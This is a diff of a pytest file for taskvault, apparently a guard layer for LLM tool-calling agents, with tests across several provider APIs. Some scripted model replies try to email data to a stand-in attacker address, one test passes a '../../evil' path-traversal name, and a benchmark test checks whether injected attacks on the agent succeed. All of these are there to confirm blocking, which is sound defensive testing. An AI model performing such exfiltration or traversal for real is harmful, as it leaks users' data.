@@ -1,5 +1,6 @@
+# Copyright 2026 AgentP-Codes
+# SPDX-License-Identifier: AGPL-3.0-only
 import json
-from types import SimpleNamespace as NS
 
 import pytest
 
@@ -10,57 +11,65 @@ from taskvault.llm import AnthropicProvider, OpenAIProvider, ToolAgent, privileg
 from taskvault.planner import PlanError
 
 
-class FakeAnthropic:
-    """Mimics anthropic.Anthropic().messages.create for a scripted tool-use conversation."""
+class Recorder:
+    """A stand-in for the network: returns scripted API replies (in each API's real JSON format)."""
 
-    def __init__(self, script):
-        self.script, self.requests = list(script), []
-        self.messages = self
+    def __init__(self, replies):
+        self.replies, self.requests = list(replies), []
 
-    def create(self, **kw):
-        self.requests.append(json.loads(json.dumps(kw, default=lambda o: o.__dict__)))
-        return self.script.pop(0)
-
-
-def tool_use(id_, name, inp):
-    return NS(type="tool_use", id=id_, name=name, input=inp)
-
-
-def text(t):
-    return NS(type="text", text=t)
+    def __call__(self, url, body, headers):
+        self.requests.append((url, json.loads(json.dumps(body)), headers))
+        return self.replies.pop(0)
 
 
 def test_anthropic_tool_loop_runs_through_the_vault():
     world = World()
     task = make_vault(world).start_task("support_reply", customer_id=12)
-    client = FakeAnthropic([
-        NS(content=[tool_use("a", "get_customer", {})]),
-        NS(content=[tool_use("b", "send_email", {"to": "audit@acme-billing.example", "subject": "x", "body": "y"})]),
-        NS(content=[text("I couldn't send that.")]),
+    net = Recorder([
+        {"content": [{"type": "tool_use", "id": "a", "name": "get_customer", "input": {}}]},
+        {"content": [{"type": "text", "text": "Sending now."}, {"type": "tool_use", "id": "b", "name": "send_email",
+                      "input": {"to": "audit@acme-billing.example", "subject": "x", "body": "y"}}]},
+        {"content": [{"type": "text", "text": "I couldn't send that."}]},
     ])
-    agent = ToolAgent(AnthropicProvider("test-model", client=client))
+    agent = ToolAgent(AnthropicProvider("test-model", api_key="k", transport=net))
     assert agent(task, {"ticket": "hi"}) == "I couldn't send that."
     assert [s for _, _, s in agent.log] == ["ok", "blocked"]
-    results = client.requests[2]["messages"][-1]["content"]
+    url, body, headers = net.requests[2]
+    assert url == "https://api.anthropic.com/v1/messages" and headers["x-api-key"] == "k"
+    results = body["messages"][-1]["content"]
     assert results[0]["is_error"] and "Blocked by taskvault" in results[0]["content"]
-    tools = {t["name"] for t in client.requests[0]["tools"]}
-    assert tools == {"get_customer", "get_doc", "send_email", "refund"}
+    assert body["messages"][-2]["content"][0] == {"type": "text", "text": "Sending now."}   # assistant turn kept
+    assert {t["name"] for t in net.requests[0][1]["tools"]} == {"get_customer", "get_doc", "send_email", "refund"}
     assert world.outbox == []
 
 
 def test_openai_tool_loop():
     world = World()
     task = make_vault(world).start_task("support_reply", customer_id=12)
-    call = lambda i, n, a: NS(id=i, function=NS(name=n, arguments=json.dumps(a)))  # noqa: E731
-    replies = [
-        NS(choices=[NS(message=NS(content=None, tool_calls=[call("1", "get_customer", {})]))]),
-        NS(choices=[NS(message=NS(content=None, tool_calls=[
-            call("2", "send_email", {"to": "priya.shah@example.com", "subject": "Hi", "body": "Sorted!"})]))]),
-        NS(choices=[NS(message=NS(content="done", tool_calls=None))]),
-    ]
-    client = NS(chat=NS(completions=NS(create=lambda **kw: replies.pop(0))))
-    assert ToolAgent(OpenAIProvider("m", client=client))(task, {"ticket": "hi"}) == "done"
+    call = lambda i, n, a: {"id": i, "type": "function", "function": {"name": n, "arguments": json.dumps(a)}}  # noqa: E731
+    net = Recorder([
+        {"choices": [{"message": {"role": "assistant", "content": None,
+                                  "tool_calls": [call("1", "get_customer", {})]}}]},
+        {"choices": [{"message": {"role": "assistant", "content": None, "tool_calls": [
+            call("2", "send_email", {"to": "priya.shah@example.com", "subject": "Hi", "body": "Sorted!"})]}}]},
+        {"choices": [{"message": {"role": "assistant", "content": "done"}}]},
+    ])
+    assert ToolAgent(OpenAIProvider("m", api_key="k", transport=net))(task, {"ticket": "hi"}) == "done"
     assert world.outbox[0]["to"] == "priya.shah@example.com"
+    assert net.requests[0][0] == "https://api.openai.com/v1/chat/completions"
+    assert net.requests[0][2] == {"authorization": "Bearer k"}
+
+
+def test_ollama_uses_the_local_server_and_sends_no_key(monkeypatch):
+    from taskvault.llm import OllamaProvider
+    monkeypatch.delenv("OLLAMA_HOST", raising=False)
+    net = Recorder([{"choices": [{"message": {"content": "hi"}}]}])
+    p = OllamaProvider(transport=net)
+    assert p.complete("s", "u") == "hi" and p.model == "hermes3"
+    url, _, headers = net.requests[0]
+    assert url == "http://localhost:11434/v1/chat/completions" and headers == {}
+    monkeypatch.setenv("OLLAMA_HOST", "192.168.1.20:11434")
+    assert OllamaProvider(transport=net).base == "http://192.168.1.20:11434/v1"
 
 
 class Canned:
@@ -99,35 +108,33 @@ def test_benchmark_offline(sc):
     assert raw["attack_succeeded"] == sc.injected
 
 
-def test_gemini_tool_loop_with_real_sdk_types():
-    types = pytest.importorskip("google.genai.types")
+def test_gemini_tool_loop():
     from taskvault.llm import GeminiProvider
 
     world = World()
     task = make_vault(world).start_task("support_reply", customer_id=12)
-    fc = lambda name, args: NS(name=name, args=args)  # noqa: E731
-    replies = [
-        NS(function_calls=[fc("get_customer", {})], text=None,
-           candidates=[NS(content=types.Content(role="model", parts=[types.Part(text="looking up")]))]),
-        NS(function_calls=[fc("send_email", {"to": "attacker@evil.example", "subject": "x", "body": "y"})],
-           text=None, candidates=[NS(content=types.Content(role="model", parts=[types.Part(text="sending")]))]),
-        NS(function_calls=[], text="I couldn't send that.", candidates=[]),
-    ]
-    seen = []
-
-    def generate_content(model, contents, config):
-        seen.append((model, contents, config))
-        return replies.pop(0)
-
-    client = NS(models=NS(generate_content=generate_content))
-    agent = ToolAgent(GeminiProvider("gemini-test", client=client, types_module=types))
+    fc = lambda name, args, **kw: {"functionCall": {"name": name, "args": args}, **kw}  # noqa: E731
+    net = Recorder([
+        {"candidates": [{"content": {"role": "model", "parts": [
+            {"text": "thinking", "thought": True}, fc("get_customer", {}, thoughtSignature="sig1")]}}]},
+        {"candidates": [{"content": {"role": "model", "parts": [
+            fc("send_email", {"to": "attacker@evil.example", "subject": "x", "body": "y"})]}}]},
+        {"candidates": [{"content": {"role": "model", "parts": [{"text": "I couldn't send that."}]}}]},
+    ])
+    agent = ToolAgent(GeminiProvider("gemini-test", api_key="k", transport=net))
     assert agent(task, {"ticket": "hi"}) == "I couldn't send that."
     assert [s for _, _, s in agent.log] == ["ok", "blocked"]
-    names = {d.name for d in seen[0][2].tools[0].function_declarations}
+    url, first, headers = net.requests[0]
+    assert url.endswith("/v1beta/models/gemini-test:generateContent") and headers == {"x-goog-api-key": "k"}
+    assert "k" not in url                                                   # key in a header, never the URL
+    names = {d["name"] for d in first["tools"][0]["functionDeclarations"]}
     assert names == {"get_customer", "get_doc", "send_email", "refund"}
-    last = seen[2][1][-1].parts[0].function_response
-    assert "Blocked by taskvault" in last.response["error"]
+    last = net.requests[2][1]["contents"]
+    assert last[1]["parts"][1]["thoughtSignature"] == "sig1"                # the model's own turn is sent back as-is
+    assert "Blocked by taskvault" in last[-1]["parts"][0]["functionResponse"]["response"]["error"]
     assert world.outbox == []
+    with pytest.raises(ValueError):
+        GeminiProvider("../../evil", api_key="k", transport=net)
 
 
 class Scripted:
@@ -174,23 +181,61 @@ def test_extractor_none_means_the_action_is_skipped():
     assert world.refunds == []
 
 
-def test_gemini_waits_out_per_minute_limits_and_stops_on_daily_quota():
+def test_providers_wait_out_rate_limits_and_stop_on_quota():
     from taskvault.llm import GeminiProvider, QuotaExhausted
+    from taskvault.webclient import ProviderError
     calls, waits = [], []
+    ok = {"candidates": [{"content": {"parts": [{"text": "ok"}]}}]}
 
-    def generate_content(**kw):
-        calls.append(kw)
+    def flaky(url, body, headers):
+        calls.append(url)
         if len(calls) == 1:
-            raise RuntimeError("429 RESOURCE_EXHAUSTED ... PerMinute ... Please retry in 3.5s.")
-        return NS(text="ok")
+            raise ProviderError(429, "Resource exhausted", body='{"error": {"details": [{"retryDelay": "3.5s"}]}}')
+        return ok
 
-    types = NS(GenerateContentConfig=lambda **kw: kw)
-    g = GeminiProvider("m", client=NS(models=NS(generate_content=generate_content)), types_module=types)
+    g = GeminiProvider("m", api_key="k", transport=flaky)
     g.sleep = waits.append
     assert g.complete("sys", "hi") == "ok" and waits == [4.5]
 
-    def daily(**kw):
-        raise RuntimeError("429 RESOURCE_EXHAUSTED GenerateRequestsPerDayPerProjectPerModel-FreeTier")
-    g.client = NS(models=NS(generate_content=daily))
+    def daily(url, body, headers):
+        raise ProviderError(429, "quota", body="GenerateRequestsPerDayPerProjectPerModel-FreeTier")
+    g.transport = daily
     with pytest.raises(QuotaExhausted):
         g.complete("sys", "hi")
+
+    def no_credit(url, body, headers):
+        raise ProviderError(400, "Your credit balance is too low",
+                            body='{"error": {"message": "Your credit balance is too low"}}')
+    a = AnthropicProvider("m", api_key="k", transport=no_credit)
+    with pytest.raises(QuotaExhausted):
+        a.complete("s", "u")
+
+    tries = []
+
+    def overloaded(url, body, headers):
+        tries.append(1)
+        raise ProviderError(529, "Overloaded", retry_after=None)
+    a = AnthropicProvider("m", api_key="k", transport=overloaded)
+    a.sleep = lambda s: None
+    with pytest.raises(ProviderError):
+        a.complete("s", "u")
+    assert len(tries) == a.max_waits + 1
+
+    def bad_request(url, body, headers):
+        tries.append(1)
+        raise ProviderError(400, "bad")
+    tries.clear()
+    a.transport = bad_request
+    with pytest.raises(ProviderError):
+        a.complete("s", "u")
+    assert len(tries) == 1                                                   # not retried
+
+
+def test_providers_need_a_key(monkeypatch):
+    for var in ("ANTHROPIC_API_KEY", "GEMINI_API_KEY", "GOOGLE_API_KEY"):
+        monkeypatch.delenv(var, raising=False)
+    from taskvault.llm import GeminiProvider
+    with pytest.raises(ValueError, match="ANTHROPIC_API_KEY"):
+        AnthropicProvider("m")
+    with pytest.raises(ValueError, match="GEMINI_API_KEY"):
+        GeminiProvider("m")
